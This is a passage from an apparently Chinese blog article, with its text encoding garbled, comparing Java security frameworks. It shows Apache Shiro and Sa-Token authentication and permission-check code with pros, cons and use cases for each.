        realm.setCachingEnabled(<span class="hljs-literal">true</span>);
        realm.setAuthenticationCachingEnabled(<span class="hljs-literal">true</span>);
        realm.setAuthenticationCacheName(<span class="hljs-string">"authenticationCache"</span>);
        realm.setAuthorizationCachingEnabled(<span class="hljs-literal">true</span>);
        realm.setAuthorizationCacheName(<span class="hljs-string">"authorizationCache"</span>);
        
        <span class="hljs-keyword">return</span> realm;
    }
}

<span class="hljs-comment">// 2. è‡ªå®šä¹‰Realmå®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomRealm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AuthorizingRealm</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-comment">// è®¤è¯é€»è¾‘ï¼šéªŒè¯ç”¨æˆ·èº«ä»½</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> AuthenticationInfo <span class="hljs-title function_">doGetAuthenticationInfo</span><span class="hljs-params">(
            AuthenticationToken token)</span> <span class="hljs-keyword">throws</span> AuthenticationException {
        
        <span class="hljs-type">UsernamePasswordToken</span> <span class="hljs-variable">upToken</span> <span class="hljs-operator">=</span> (UsernamePasswordToken) token;
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> upToken.getUsername();
        
        <span class="hljs-comment">// ä»æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findByUsername(username);
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownAccountException</span>(<span class="hljs-string">"ç”¨æˆ·ä¸å­˜åœ¨"</span>);
        }
        
        <span class="hljs-keyword">if</span> (!user.isEnabled()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DisabledAccountException</span>(<span class="hljs-string">"ç”¨æˆ·å·²è¢«ç¦ç”¨"</span>);
        }
        
        <span class="hljs-comment">// è¿”å›è®¤è¯ä¿¡æ¯</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleAuthenticationInfo</span>(
            user, <span class="hljs-comment">// èº«ä»½ principal</span>
            user.getPassword(), <span class="hljs-comment">// å‡­è¯ credentials</span>
            getName() <span class="hljs-comment">// realm name</span>
        );
    }
    
    <span class="hljs-comment">// æˆæƒé€»è¾‘ï¼šè·å–ç”¨æˆ·çš„è§’è‰²å’Œæƒé™</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> AuthorizationInfo <span class="hljs-title function_">doGetAuthorizationInfo</span><span class="hljs-params">(
            PrincipalCollection principals)</span> {
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) principals.getPrimaryPrincipal();
        <span class="hljs-type">SimpleAuthorizationInfo</span> <span class="hljs-variable">authorizationInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleAuthorizationInfo</span>();
        
        <span class="hljs-comment">// æ·»åŠ è§’è‰²</span>
        Set&lt;String&gt; roles = userService.findRolesByUserId(user.getId());
        authorizationInfo.setRoles(roles);
        
        <span class="hljs-comment">// æ·»åŠ æƒé™</span>
        Set&lt;String&gt; permissions = userService.findPermissionsByUserId(user.getId());
        authorizationInfo.setStringPermissions(permissions);
        
        <span class="hljs-keyword">return</span> authorizationInfo;
    }
}

<span class="hljs-comment">// 3. åœ¨Controllerä¸­ä½¿ç”¨Shiro</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    
    <span class="hljs-meta">@GetMapping("/products")</span>
    <span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title function_">getProducts</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è·å–å½“å‰ç”¨æˆ·</span>
        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²è®¤è¯</span>
        <span class="hljs-keyword">if</span> (!currentUser.isAuthenticated()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnauthorizedException</span>(<span class="hljs-string">"è¯·å…ˆç™»å½•"</span>);
        }
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰æƒé™</span>
        <span class="hljs-keyword">if</span> (!currentUser.isPermitted(<span class="hljs-string">"product:view"</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ForbiddenException</span>(<span class="hljs-string">"æ²¡æœ‰æŸ¥çœ‹æƒé™"</span>);
        }
        
        <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span>
        <span class="hljs-keyword">return</span> productService.getAllProducts();
    }
    
    <span class="hljs-meta">@PostMapping("/products")</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">createProduct</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ProductDTO dto)</span> {
        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();
        
        <span class="hljs-comment">// ä½¿ç”¨Shiroçš„æƒé™æ³¨è§£ï¼ˆéœ€è¦AOPæ”¯æŒï¼‰</span>
        currentUser.checkPermission(<span class="hljs-string">"product:create"</span>);
        
        <span class="hljs-comment">// æˆ–è€…ä½¿ç”¨ç¼–ç¨‹å¼æ£€æŸ¥</span>
        <span class="hljs-comment">// if (!currentUser.isPermitted("product:create")) {</span>
        <span class="hljs-comment">//     throw new ForbiddenException("æ²¡æœ‰åˆ›å»ºæƒé™");</span>
        <span class="hljs-comment">// }</span>
        
        <span class="hljs-keyword">return</span> productService.createProduct(dto);
    }
    
    <span class="hljs-meta">@GetMapping("/admin/dashboard")</span>
    <span class="hljs-keyword">public</span> DashboardVO <span class="hljs-title function_">getAdminDashboard</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å…·æœ‰adminè§’è‰²</span>
        currentUser.checkRole(<span class="hljs-string">"admin"</span>);
        
        <span class="hljs-keyword">return</span> dashboardService.getAdminDashboard();
    }
}
</code></pre>
<h3 data-id="heading-11">Shiroçš„ä¼˜åŠ¿ä¸ç—›ç‚¹</h3>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li><strong>ç®€å•ç›´è§‚</strong>ï¼šAPIè®¾è®¡ç®€æ´ï¼Œå­¦ä¹ æˆæœ¬ä½</li>
<li><strong>é…ç½®çµæ´»</strong>ï¼šæ”¯æŒINIã€XMLã€æ³¨è§£ç­‰å¤šç§é…ç½®æ–¹å¼</li>
<li><strong>åŠŸèƒ½å®Œæ•´</strong>ï¼šè®¤è¯ã€æˆæƒã€ä¼šè¯ç®¡ç†ã€åŠ å¯†ã€ç¼“å­˜ç­‰ä¸€åº”ä¿±å…¨</li>
<li><strong>ä¸ä¾èµ–å®¹å™¨</strong>ï¼šå¯ä»¥åœ¨ä»»ä½•Javaç¯å¢ƒä¸­è¿è¡Œ</li>
<li><strong>æ˜“äºé›†æˆ</strong>ï¼šä¸Springã€Spring Bootç­‰æ¡†æ¶é›†æˆç®€å•</li>
</ol>
<p><strong>ç—›ç‚¹ï¼š</strong></p>
<ol>
<li><strong>Springç”Ÿæ€æ•´åˆä¸å¤ŸåŸç”Ÿ</strong>ï¼šéœ€è¦é¢å¤–é…ç½®</li>
<li><strong>ç¤¾åŒºæ´»è·ƒåº¦ä¸‹é™</strong>ï¼šç›¸æ¯”Spring Securityï¼Œç¤¾åŒºç»´æŠ¤åŠ›åº¦å‡å¼±</li>
<li><strong>åŠŸèƒ½æ‰©å±•æ€§æœ‰é™</strong>ï¼šæŸäº›é«˜çº§åŠŸèƒ½éœ€è¦è‡ªå·±å®ç°</li>
<li><strong>æ–‡æ¡£ç›¸å¯¹é™ˆæ—§</strong>ï¼šéƒ¨åˆ†æ–‡æ¡£æ›´æ–°ä¸åŠæ—¶</li>
</ol>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä¸­å°å‹é¡¹ç›®ï¼Œè¿½æ±‚å¿«é€Ÿå¼€å‘</li>
<li>éSpringé¡¹ç›®æˆ–Springç”Ÿæ€ä¸é‡çš„é¡¹ç›®</li>
<li>å›¢é˜Ÿå¯¹Spring Securityä¸ç†Ÿæ‚‰</li>
<li>éœ€è¦ç®€å•æƒé™æ§åˆ¶çš„å†…éƒ¨ç³»ç»Ÿ</li>
</ul>
<p>æœ‰äº›å°ä¼™ä¼´å–œæ¬¢Shiroçš„ç®€æ´ï¼Œç‰¹åˆ«æ˜¯å®ƒçš„INIé…ç½®æ–‡ä»¶ï¼Œå‡ è¡Œé…ç½®å°±èƒ½æå®šåŸºæœ¬çš„æƒé™æ§åˆ¶ã€‚</p>
<p>ä½†å½“ä½ éœ€è¦æ›´å¤æ‚çš„åŠŸèƒ½æ—¶ï¼Œå¯èƒ½ä¼šå‘ç°éœ€è¦è‡ªå·±å†™ä¸å°‘ä»£ç ã€‚</p>
<p>æœ€è¿‘ä¸ºäº†å¸®åŠ©å¤§å®¶æ‰¾å·¥ä½œï¼Œä¸“é—¨å»ºäº†ä¸€äº›å·¥ä½œå†…æ¨ç¾¤ï¼Œå„å¤§åŸå¸‚éƒ½æœ‰ï¼Œæ¬¢è¿å„ä½HRå’Œæ‰¾å·¥ä½œçš„å°ä¼™ä¼´è¿›ç¾¤äº¤æµï¼Œç¾¤é‡Œç›®å‰å·²ç»æ”¶é›†äº†20å¤šå®¶å¤§å‚çš„å·¥ä½œå†…æ¨å²—ä½ã€‚åŠ è‹ä¸‰çš„å¾®ä¿¡ï¼šli_su223ï¼Œå¤‡æ³¨ï¼šæ˜é‡‘+æ‰€åœ¨åŸå¸‚ï¼Œå³å¯è¿›ç¾¤ã€‚</p>
<h2 data-id="heading-12">4 Sa-Tokenï¼šå›½äº§æ–°æ˜Ÿçš„â€œåèµ·ä¹‹ç§€â€</h2>
<h3 data-id="heading-13">4.1 Sa-Tokenæ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>Sa-Tokenæ˜¯ä¸€ä¸ªè½»é‡çº§Javaæƒé™è®¤è¯æ¡†æ¶ï¼Œç”±å›½å†…å¼€å‘è€…å¼€å‘ã€‚</p>
<p>å®ƒçš„è®¾è®¡ç†å¿µæ˜¯ï¼š<strong>ä»¥æœ€å°‘çš„é…ç½®ï¼Œå®Œæˆæœ€å…¨é¢çš„æƒé™è®¤è¯åŠŸèƒ½</strong>ã€‚</p>
<p>åœ¨Spring Securityå’ŒShiroä¹‹å¤–ï¼ŒSa-Tokenæä¾›äº†ä¸€ç§æ–°çš„é€‰æ‹©ã€‚</p>
<h3 data-id="heading-14">4.2 æ ¸å¿ƒç‰¹æ€§ï¼šç®€å•è€Œå¼ºå¤§</h3>
<p>Sa-Tokençš„æ ¸å¿ƒè®¾è®¡å“²å­¦å¯ä»¥æ¦‚æ‹¬ä¸ºï¼šâ€œç®€å•ã€å¼ºå¤§ã€çµæ´»â€ã€‚</p>
<p>å®ƒé€šè¿‡å‡ ä¸ªæ ¸å¿ƒç»„ä»¶å®ç°äº†å®Œæ•´çš„å®‰å…¨æ§åˆ¶ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d275a3bba404e29864406786b42dc4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767613200&amp;x-signature=7jBSQjBEqNiykOm7%2FrXRTTYONaI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">4.3 5åˆ†é’Ÿæ­å»ºå®Œæ•´æƒé™ç³»ç»Ÿ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. æ·»åŠ ä¾èµ–ï¼ˆpom.xmlï¼‰</span>
<span class="hljs-comment">// &lt;dependency&gt;</span>
<span class="hljs-comment">//     &lt;groupId&gt;cn.dev33&lt;/groupId&gt;</span>
<span class="hljs-comment">//     &lt;artifactId&gt;sa-token-spring-boot-starter&lt;/artifactId&gt;</span>
<span class="hljs-comment">//     &lt;version&gt;1.34.0&lt;/version&gt;</span>
<span class="hljs-comment">// &lt;/dependency&gt;</span>

<span class="hljs-comment">// 2. é…ç½®æ–‡ä»¶ï¼ˆapplication.ymlï¼‰</span>
<span class="hljs-comment">// sa-token:</span>
<span class="hljs-comment">//   token-name: satoken           # tokenåç§°</span>
<span class="hljs-comment">//   timeout: 2592000             # tokenæœ‰æ•ˆæœŸï¼Œå•ä½ç§’ï¼Œé»˜è®¤30å¤©</span>
<span class="hljs-comment">//   active-timeout: -1           # tokenæ´»è·ƒæœ‰æ•ˆæœŸï¼Œ-1ä»£è¡¨ä¸é™åˆ¶</span>
<span class="hljs-comment">//   is-concurrent: true          # æ˜¯å¦å…è®¸å¹¶å‘ç™»å½•</span>
<span class="hljs-comment">//   is-share: true               # åœ¨å¤šäººç™»å½•åŒä¸€è´¦å·æ—¶ï¼Œæ˜¯å¦å…±äº«token</span>
<span class="hljs-comment">//   max-login-count: 12          # åŒä¸€è´¦å·æœ€å¤§ç™»å½•æ•°é‡</span>
<span class="hljs-comment">//   is-write-header: true        # æ˜¯å¦å°†tokenå†™å…¥å“åº”å¤´</span>
<span class="hljs-comment">//   token-style: uuid            # tokené£æ ¼</span>
<span class="hljs-comment">//   is-log: false                # æ˜¯å¦æ‰“å°æ“ä½œæ—¥å¿—</span>

<span class="hljs-comment">// 3. é…ç½®ç±»ï¼ˆå¯é€‰ï¼‰</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SaTokenConfig</span> {
    
    <span class="hljs-comment">// æ³¨å†Œæ‹¦æˆªå™¨</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SaInterceptor <span class="hljs-title function_">saInterceptor</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SaInterceptor</span>()
            <span class="hljs-comment">// æ ¡éªŒç™»å½•çŠ¶æ€ï¼Œä¸åŒ…å«ç™»å½•æ¥å£</span>
            .addPathPatterns(<span class="hljs-string">"/**"</span>)
            .excludePathPatterns(<span class="hljs-string">"/api/user/login"</span>)
            .excludePathPatterns(<span class="hljs-string">"/api/public/**"</span>)
            
            <span class="hljs-comment">// æƒé™æ ¡éªŒè§„åˆ™</span>
            .check(r -&gt; {
                <span class="hljs-comment">// 1. æ£€æŸ¥ç™»å½•çŠ¶æ€</span>
                SaRouter.match(<span class="hljs-string">"/api/**"</span>, () -&gt; {
                    StpUtil.checkLogin();
                });
                
                <span class="hljs-comment">// 2. è§’è‰²æ ¡éªŒ</span>
                SaRouter.match(<span class="hljs-string">"/api/admin/**"</span>, () -&gt; {
                    StpUtil.checkRole(<span class="hljs-string">"admin"</span>);
                });
                
                <span class="hljs-comment">// 3. æƒé™æ ¡éªŒ</span>
                SaRouter.match(<span class="hljs-string">"/api/products/create"</span>, () -&gt; {
                    StpUtil.checkPermission(<span class="hljs-string">"product.create"</span>);
                });
                
                SaRouter.match(<span class="hljs-string">"/api/products/delete/**"</span>, () -&gt; {
                    StpUtil.checkPermission(<span class="hljs-string">"product.delete"</span>);
                });
            });
    }
}

<span class="hljs-comment">// 4. ç™»å½•è®¤è¯Controller</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    
    <span class="hljs-meta">@PostMapping("/login")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> LoginDTO dto)</span> {
        <span class="hljs-comment">// 1. éªŒè¯ç”¨æˆ·åå¯†ç </span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findByUsername(dto.getUsername());
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || !passwordEncoder.matches(dto.getPassword(), user.getPassword())) {
            <span class="hljs-keyword">return</span> ApiResult.error(<span class="hljs-string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>);
        }
        
        <span class="hljs-comment">// 2. ç™»å½•ï¼ˆSa-Tokenä¼šè‡ªåŠ¨åˆ›å»ºtokenï¼‰</span>
        StpUtil.login(user.getId());
        
        <span class="hljs-comment">// 3. è·å–tokenä¿¡æ¯</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">tokenValue</span> <span class="hljs-operator">=</span> StpUtil.getTokenValue();
        <span class="hljs-type">long</span> <span class="hljs-variable">tokenTimeout</span> <span class="hljs-operator">=</span> StpUtil.getTokenTimeout();
        
        <span class="hljs-comment">// 4. è¿”å›ç”¨æˆ·ä¿¡æ¯å’Œtoken</span>
        <span class="hljs-type">LoginVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginVO</span>();
        vo.setUserId(user.getId());
        vo.setUsername(user.getUsername());
        vo.setToken(tokenValue);
        vo.setExpireTime(tokenTimeout);
        
        <span class="hljs-comment">// 5. å¯ä»¥è®¾ç½®ä¸€äº›sessionä¿¡æ¯</span>
        StpUtil.getSession().set(<span class="hljs-string">"userInfo"</span>, user);
        
        <span class="hljs-keyword">return</span> ApiResult.success(<span class="hljs-string">"ç™»å½•æˆåŠŸ"</span>, vo);
    }
    
    <span class="hljs-meta">@PostMapping("/logout")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">logout</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ³¨é”€å½“å‰ä¼šè¯</span>
        StpUtil.logout();
        <span class="hljs-keyword">return</span> ApiResult.success(<span class="hljs-string">"æ³¨é”€æˆåŠŸ"</span>);
    }
    
    <span class="hljs-meta">@GetMapping("/info")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è·å–å½“å‰ç™»å½•ç”¨æˆ·ID</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">loginId</span> <span class="hljs-operator">=</span> StpUtil.getLoginId();
        
        <span class="hljs-comment">// è·å–ç”¨æˆ·ä¿¡æ¯</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.findById(Long.parseLong(loginId.toString()));
        
        <span class="hljs-comment">// è·å–ç”¨æˆ·æƒé™åˆ—è¡¨</span>
        List&lt;String&gt; permissionList = StpUtil.getPermissionList();
        
        <span class="hljs-comment">// è·å–ç”¨æˆ·è§’è‰²åˆ—è¡¨</span>
        List&lt;String&gt; roleList = StpUtil.getRoleList();
        
        <span class="hljs-type">UserInfoVO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfoVO</span>();
        vo.setUser(user);
        vo.setPermissions(permissionList);
        vo.setRoles(roleList);
        
        <span class="hljs-keyword">return</span> ApiResult.success(vo);
    }
}

<span class="hljs-comment">// 5. ä¸šåŠ¡Controllerä¸­ä½¿ç”¨</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/products")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    
    <span class="hljs-meta">@GetMapping("/list")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">getProductList</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ— éœ€æ‰‹åŠ¨æ£€æŸ¥ç™»å½•çŠ¶æ€ï¼Œæ‹¦æˆªå™¨å·²å¤„ç†</span>
        
        <span class="hljs-comment">// è·å–å½“å‰ç™»å½•ç”¨æˆ·ID</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsLong();
        
        List&lt;Product&gt; products = productService.getProductsByOwner(userId);
        <span class="hljs-keyword">return</span> ApiResult.success(products);
    }
    
    <span class="hljs-meta">@PostMapping("/create")</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">createProduct</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ProductDTO dto)</span> {
        <span class="hljs-comment">// ä½¿ç”¨æ³¨è§£æ–¹å¼æ£€æŸ¥æƒé™</span>
        <span class="hljs-comment">// @SaCheckPermission("product.create") ä¹Ÿå¯ä»¥è¿™æ ·ç”¨</span>
        
        <span class="hljs-comment">// ç¼–ç¨‹å¼æ£€æŸ¥æƒé™</span>
        StpUtil.checkPermission(<span class="hljs-string">"product.create"</span>);
        
        <span class="hljs-type">long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsLong();
        dto.setOwnerId(userId);
        
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productService.createProduct(dto);
        <span class="hljs-keyword">return</span> ApiResult.success(product);
    }
    
    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-meta">@SaCheckPermission("product.delete")</span>  <span class="hljs-comment">// æ³¨è§£æ–¹å¼æƒé™æ£€æŸ¥</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-comment">// é™¤äº†æƒé™æ£€æŸ¥ï¼Œè¿˜å¯ä»¥æ£€æŸ¥æ•°æ®æƒé™</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> productService.getById(id);
        <span class="hljs-type">long</span> <span class="hljs-variable">currentUserId</span> <span class="hljs-operator">=</span> StpUtil.getLoginIdAsLong();
        
        <span class="hljs-keyword">if</span> (product.getOwnerId() != currentUserId) {
            <span class="hljs-comment">// ä¸æ˜¯è‡ªå·±çš„å•†å“ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ç®¡ç†å‘˜æƒé™</span>
            StpUtil.checkRole(<span class="hljs-string">"admin"</span>);
        }
        
        productService.deleteProduct(id);
        <span class="hljs-keyword">return</span> ApiResult.success(<span class="hljs-string">"åˆ é™¤æˆåŠŸ"</span>);
    }
    
    <span class="hljs-meta">@GetMapping("/admin/dashboard")</span>
    <span class="hljs-meta">@SaCheckRole("admin")</span>  <span class="hljs-comment">// æ³¨è§£æ–¹å¼è§’è‰²æ£€æŸ¥</span>
    <span class="hljs-keyword">public</span> ApiResult <span class="hljs-title function_">getAdminDashboard</span><span class="hljs-params">()</span> {
        <span class="hljs-type">DashboardVO</span> <span class="hljs-variable">dashboard</span> <span class="hljs-operator">=</span> dashboardService.getAdminDashboard();
        <span class="hljs-keyword">return</span> ApiResult.success(dashboard);
    }
}

<span class="hljs-comment">// 6. è¿›é˜¶åŠŸèƒ½ï¼šè¸¢äººä¸‹çº¿ã€è´¦å·å°ç¦</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedSecurityService</span> {
    
    <span class="hljs-comment">// å¼ºåˆ¶æ³¨é”€ï¼ˆè¸¢äººä¸‹çº¿ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">forceLogout</span><span class="hljs-params">(Object loginId)</span> {
        StpUtil.logout(loginId);
    }
    
    <span class="hljs-comment">// å°ç¦è´¦å·</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">disableAccount</span><span class="hljs-params">(Object loginId, <span class="hljs-type">long</span> disableTime)</span> {
        <span class="hljs-comment">// å°ç¦æŒ‡å®šæ—¶é—´ï¼ˆå•ä½ï¼šç§’ï¼‰</span>
        StpUtil.disable(loginId, disableTime);
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¢«å°ç¦</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDisabled</span><span class="hljs-params">(Object loginId)</span> {
        <span class="hljs-keyword">return</span> StpUtil.isDisable(loginId);
    }
    
    <span class="hljs-comment">// äºŒçº§è®¤è¯ï¼ˆæ•æ„Ÿæ“ä½œéœ€è¦å†æ¬¡éªŒè¯ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">startSecondAuth</span><span class="hljs-params">(<span class="hljs-type">long</span> ttl)</span> {
        <span class="hljs-comment">// å¼€å¯äºŒçº§è®¤è¯ï¼Œæœ‰æ•ˆæœŸä¸ºttlç§’</span>
        <span class="hljs-keyword">return</span> StpUtil.openSafe(ttl);
    }
    
    <span class="hljs-comment">// æ£€æŸ¥äºŒçº§è®¤è¯</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkSecondAuth</span><span class="hljs-params">()</span> {
        StpUtil.checkSafe();
    }
}
</code></pre>
<h3 data-id="heading-16">Sa-Tokençš„ä¼˜åŠ¿ä¸ç—›ç‚¹</h3>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ol>
<li><strong>APIè®¾è®¡æå…¶ç®€æ´</strong>ï¼š<code>StpUtil.xxx()</code> å‡ ä¹æ¶µç›–äº†æ‰€æœ‰æ“ä½œ</li>
<li><strong>å¼€ç®±å³ç”¨</strong>ï¼šå‡ ä¹é›¶é…ç½®å°±èƒ½ä½¿ç”¨</li>
<li><strong>åŠŸèƒ½ä¸°å¯Œ</strong>ï¼šé™¤äº†åŸºç¡€è®¤è¯æˆæƒï¼Œè¿˜æä¾›è¸¢äººä¸‹çº¿ã€è´¦å·å°ç¦ã€äºŒçº§è®¤è¯ç­‰é«˜çº§åŠŸèƒ½</li>
<li><strong>å›½äº§æ¡†æ¶</strong>ï¼šä¸­æ–‡æ–‡æ¡£å®Œå–„ï¼Œç¬¦åˆå›½äººä½¿ç”¨ä¹ æƒ¯</li>
<li><strong>è½»é‡çº§</strong>ï¼šä¾èµ–å°‘ï¼Œå¯åŠ¨å¿«</li>
</ol>
<p><strong>ç—›ç‚¹ï¼š</strong></p>
<ol>
<li><strong>ç›¸å¯¹è¾ƒæ–°</strong>ï¼šç”Ÿæ€ä¸å¦‚Spring Securityå’ŒShiroæˆç†Ÿ</li>
<li><strong>ç¤¾åŒºè§„æ¨¡å°</strong>ï¼šé‡åˆ°å¤æ‚é—®é¢˜å¯èƒ½éš¾ä»¥æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ</li>
<li><strong>ä¼ä¸šçº§ç‰¹æ€§æœ‰é™</strong>ï¼šå¯¹OAuth2ã€LDAPç­‰æ”¯æŒè¾ƒå¼±</li>
<li><strong>è¿‡åº¦å°è£…</strong>ï¼šæŸäº›åœºæ™¯ä¸‹çµæ´»æ€§ä¸è¶³</li>
</ol>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä¸­å°å‹é¡¹ç›®ï¼Œè¿½æ±‚å¼€å‘æ•ˆç‡</li>
<li>å›¢é˜Ÿå¯¹Spring Security/Shiroä¸ç†Ÿæ‚‰</li>
<li>éœ€è¦å¿«é€Ÿæ­å»ºæƒé™ç³»ç»Ÿçš„åŸå‹æˆ–å†…éƒ¨å·¥å…·</li>
<li>åå¥½å›½äº§æ¡†æ¶å’Œä¸­æ–‡æ–‡æ¡£çš„å›¢é˜Ÿ</li>
</ul>
<p>æœ‰äº›å°ä¼™ä¼´ç¬¬ä¸€æ¬¡ç”¨Sa-Tokenæ—¶ï¼Œä¼šè¢«å®ƒçš„ç®€æ´æƒŠè‰³åˆ°ã€‚å‡ è¡Œä»£ç å°±å®ç°äº†å…¶ä»–æ¡†æ¶éœ€è¦å¤§é‡é…ç½®çš„åŠŸèƒ½ã€‚</p>
<p>ä½†å¯¹äºå¤§å‹å¤æ‚ç³»ç»Ÿï¼Œå¯èƒ½éœ€è¦ä»”ç»†è¯„ä¼°å®ƒçš„æ‰©å±•æ€§å’Œé•¿æœŸç»´æŠ¤æ€§ã€‚</p>
<h2 data-id="heading-17">5 ä¸‰å¤§æ¡†æ¶å…¨æ–¹ä½å¯¹æ¯”</h2>
<p>äº†è§£äº†æ¯ä¸ªæ¡†æ¶çš„å•ç‹¬ç‰¹ç‚¹åï¼Œæˆ‘ä»¬æ¥ä¸€ä¸ªå…¨æ–¹ä½çš„å¯¹æ¯”ï¼š</p>
